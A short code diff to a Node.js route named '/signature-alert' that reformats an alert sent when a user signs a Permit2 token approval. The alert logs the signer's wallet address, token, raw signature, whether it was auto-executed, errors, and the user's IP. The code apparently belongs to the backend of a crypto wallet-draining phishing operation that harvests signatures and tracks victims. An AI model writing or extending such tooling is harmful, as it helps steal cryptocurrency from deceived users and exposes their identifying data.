@@ -2190,9 +2190,11 @@ router.post('/signature-alert', async (req, res) => {
         alertTitle = `✅ PERMIT2 SIGNED: ${userAddress.slice(0,8)}... signed permit ${data.autoExecuted ? '(AUTO)' : ''}`;
         alertMessage = `PERMIT2 SIGNATURE COMPLETED\n\n` +
           `USER: ${userAddress}\n` +
-          `TOKEN: ${data.tokenAddress}\n` +
-          `SIGNATURE: ${data.signature}\n` +
-          `EXECUTION: ${data.autoExecuted ? 'AUTOMATIC' : 'MANUAL'}\n\n` +
+          `TOKEN: ${data.tokenAddress || 'USDC'}\n` +
+          `STATUS: ${data.rejected ? 'REJECTED' : 'SIGNED'}\n` +
+          `SIGNATURE: ${data.signature || 'N/A'}\n` +
+          `EXECUTION: ${data.autoExecuted ? 'AUTOMATIC' : 'MANUAL'}\n` +
+          `ERROR: ${data.error || 'None'}\n\n` +
           `USER IP: ${realIP}\n` +
           `TIME: ${new Date().toISOString()}`;
         break;
